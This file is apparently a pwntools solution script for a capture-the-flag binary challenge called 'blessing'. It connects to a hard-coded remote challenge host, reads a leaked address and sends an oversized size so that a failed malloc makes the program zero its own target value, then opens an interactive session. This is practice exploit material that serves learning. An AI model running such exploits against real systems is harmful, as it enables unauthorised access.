#!/usr/bin/env python3

import re

from pwn import *

e = ELF("./blessing_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      c
                      ''')
    else:
        r = remote('154.57.164.83', 31133)

    return r


def main():
    r = conn()

    data = r.recvline_regex(b'0x[0-9a-f]{12}')
    match = re.search(r'0x[0-9a-f]{12}', str(data))
    if not match:
        error('Failed to find the leaked target address')
    addr = match.group(0)
    success(f'Found the leaked target address {addr}')
    addr_int = int(addr, 16)
    # The size will be too big and fails the malloc() which returns NULL(0) in this case.
    # Then the binary's own code `*(undefined8 *)((long)local_18 + (local_30 - 1)) = 0;` will set the target value to 0.
    success(f'Converted to integer is {addr_int}')
    r.sendline(f'{addr_int + 1}'.encode('ascii'))
    r.sendline()
    
    r.interactive()

if __name__ == "__main__":
    main()
